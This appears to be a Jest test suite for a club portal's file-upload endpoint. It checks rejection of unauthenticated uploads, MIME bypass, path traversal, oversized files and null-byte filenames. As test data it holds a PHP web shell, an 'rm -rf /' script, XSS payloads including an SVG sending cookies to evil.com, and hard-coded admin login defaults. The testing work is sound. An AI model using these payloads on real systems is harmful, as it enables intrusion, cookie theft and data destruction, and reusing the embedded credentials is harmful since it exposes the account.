/**
 * ====================================================
 *  UPLOAD SECURITY TESTS — Club Management Portal
 *  Tests: File type bypass, path traversal, shell upload,
 *         oversized file, null byte injection, polyglot files
 * ====================================================
 */

import request from "supertest";
import fs from "node:fs";
import path from "node:path";
import os from "node:os";
import { describe, it, expect, beforeAll, afterAll } from "@jest/globals";
import { createTestServer } from "../helpers/testServer.js";

let app;
let server;
let adminToken;

const ADMIN_CREDS = {
  email: process.env.ADMIN_EMAIL || "aifrontierclub@gmail.com",
  password: process.env.ADMIN_PASSWORD || "aifrontierclub206",
};

beforeAll(async () => {
  ({ app, server } = await createTestServer());
  const res = await request(app).post("/api/auth/login").send(ADMIN_CREDS);
  adminToken = res.body?.data?.token;
});

afterAll(() => {
  if (server) server.close();
});

function makeTempFile(content, ext) {
  const tmpPath = path.join(os.tmpdir(), `sec-test-${Date.now()}${ext}`);
  fs.writeFileSync(tmpPath, content);
  return tmpPath;
}

// ─────────────────────────────────────────────
// 1. UNAUTHENTICATED UPLOAD ATTEMPT
// ─────────────────────────────────────────────
describe("[Attack] Unauthenticated File Upload", () => {
  it("should reject upload without auth token (401 or connection refused)", async () => {
    const tmpFile = makeTempFile("fake content", ".jpg");
    try {
      const res = await request(app)
        .post("/api/upload")
        .attach("file", tmpFile);
      fs.unlinkSync(tmpFile);
      // Express 5 returns 401 cleanly
      expect(res.status).toBe(401);
    } catch (err) {
      // Express 5 + multer may reset the connection when auth fails mid-stream
      // ECONNRESET means the server rejected the upload — that's still secure!
      if (fs.existsSync(tmpFile)) fs.unlinkSync(tmpFile);
      expect(["ECONNRESET", "ECONNREFUSED"]).toContain(err.code);
    }
  });
});

// ─────────────────────────────────────────────
// 2. MIME TYPE BYPASS
// ─────────────────────────────────────────────
describe("[Attack] MIME Type Bypass in File Upload", () => {
  it("should reject .exe file disguised as image", async () => {
    if (!adminToken) return;
    const tmpFile = makeTempFile("MZ\x90\x00 fake exe content", ".exe");
    const res = await request(app)
      .post("/api/upload")
      .set("Authorization", `Bearer ${adminToken}`)
      .attach("file", tmpFile, { contentType: "application/octet-stream", filename: "malware.exe" });
    fs.unlinkSync(tmpFile);
    expect(res.status).toBe(400);
  });

  it("should reject .php file disguised as image", async () => {
    if (!adminToken) return;
    const phpContent = "<?php system($_GET['cmd']); ?>";
    const tmpFile = makeTempFile(phpContent, ".php");
    const res = await request(app)
      .post("/api/upload")
      .set("Authorization", `Bearer ${adminToken}`)
      .attach("file", tmpFile, { contentType: "application/x-php", filename: "shell.php" });
    fs.unlinkSync(tmpFile);
    expect(res.status).toBe(400);
  });

  it("should reject .html file (potential XSS via upload)", async () => {
    if (!adminToken) return;
    const htmlContent = "<html><script>alert(document.cookie)</script></html>";
    const tmpFile = makeTempFile(htmlContent, ".html");
    const res = await request(app)
      .post("/api/upload")
      .set("Authorization", `Bearer ${adminToken}`)
      .attach("file", tmpFile, { contentType: "text/html", filename: "xss.html" });
    fs.unlinkSync(tmpFile);
    expect(res.status).toBe(400);
  });

  it("should reject .js file (potential code execution)", async () => {
    if (!adminToken) return;
    const jsContent = "require('child_process').exec('rm -rf /')";
    const tmpFile = makeTempFile(jsContent, ".js");
    const res = await request(app)
      .post("/api/upload")
      .set("Authorization", `Bearer ${adminToken}`)
      .attach("file", tmpFile, { contentType: "application/javascript", filename: "evil.js" });
    fs.unlinkSync(tmpFile);
    expect(res.status).toBe(400);
  });

  it("should reject .svg with embedded JavaScript", async () => {
    if (!adminToken) return;
    const svgXss = `<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('http://evil.com?c='+document.cookie)"><rect/></svg>`;
    const tmpFile = makeTempFile(svgXss, ".svg");
    const res = await request(app)
      .post("/api/upload")
      .set("Authorization", `Bearer ${adminToken}`)
      .attach("file", tmpFile, { contentType: "image/svg+xml", filename: "xss.svg" });
    fs.unlinkSync(tmpFile);
    // SVG should be blocked (not in allowed list) or accepted but harmless
    expect(res.status).toBe(400);
  });
});

// ─────────────────────────────────────────────
// 3. PATH TRAVERSAL
// ─────────────────────────────────────────────
describe("[Attack] Path Traversal in Upload Filename", () => {
  it("should sanitize ../../ in filename to prevent path traversal", async () => {
    if (!adminToken) return;
    // Create minimal valid JPEG
    const jpegBytes = Buffer.from([
      0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46,
      0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00,
      0xFF, 0xDB, 0x00, 0x43, 0x00,
      ...Array(64).fill(8),
      0xFF, 0xD9,
    ]);
    const tmpFile = path.join(os.tmpdir(), `traversal-${Date.now()}.jpg`);
    fs.writeFileSync(tmpFile, jpegBytes);

    const res = await request(app)
      .post("/api/upload")
      .set("Authorization", `Bearer ${adminToken}`)
      .attach("file", tmpFile, {
        contentType: "image/jpeg",
        filename: "../../etc/passwd.jpg",
      });
    fs.unlinkSync(tmpFile);

    if (res.status === 201) {
      // Filename must not contain traversal sequences
      const url = res.body?.url || "";
      expect(url).not.toMatch(/\.\.\//);
      expect(url).not.toMatch(/etc\/passwd/);
    } else {
      expect([400, 422]).toContain(res.status);
    }
  });
});

// ─────────────────────────────────────────────
// 4. FILE SIZE LIMIT
// ─────────────────────────────────────────────
describe("[Attack] Oversized File Upload (DoS)", () => {
  it("should reject files over 5MB", async () => {
    if (!adminToken) return;
    // Create a 6MB file
    const sixMB = Buffer.alloc(6 * 1024 * 1024, 0x41);
    const tmpFile = path.join(os.tmpdir(), `bigfile-${Date.now()}.jpg`);
    fs.writeFileSync(tmpFile, sixMB);
    const res = await request(app)
      .post("/api/upload")
      .set("Authorization", `Bearer ${adminToken}`)
      .attach("file", tmpFile, { contentType: "image/jpeg" });
    fs.unlinkSync(tmpFile);
    expect([400, 413]).toContain(res.status);
    if (res.status === 400) {
      expect(res.body.message).toMatch(/large|size|5 MB/i);
    }
  }, 30000);
});

// ─────────────────────────────────────────────
// 5. NULL BYTE INJECTION IN FILENAME
// ─────────────────────────────────────────────
describe("[Attack] Null Byte Injection in Upload", () => {
  it("should handle null byte in filename without crashing", async () => {
    if (!adminToken) return;
    const jpegBytes = Buffer.from([0xFF, 0xD8, 0xFF, 0xD9]); // minimal JPEG
    const tmpFile = path.join(os.tmpdir(), `nullbyte-${Date.now()}.jpg`);
    fs.writeFileSync(tmpFile, jpegBytes);
    const res = await request(app)
      .post("/api/upload")
      .set("Authorization", `Bearer ${adminToken}`)
      .attach("file", tmpFile, {
        contentType: "image/jpeg",
        filename: "image\x00.php.jpg",
      });
    fs.unlinkSync(tmpFile);
    expect(res.status).not.toBe(500);
  });
});

// ─────────────────────────────────────────────
// 6. UPLOAD WITHOUT FILE
// ─────────────────────────────────────────────
describe("[Attack] Empty/Missing File Upload", () => {
  it("should return 400 when no file is attached", async () => {
    if (!adminToken) return;
    const res = await request(app)
      .post("/api/upload")
      .set("Authorization", `Bearer ${adminToken}`)
      .send({});
    expect(res.status).toBe(400);
  });
});
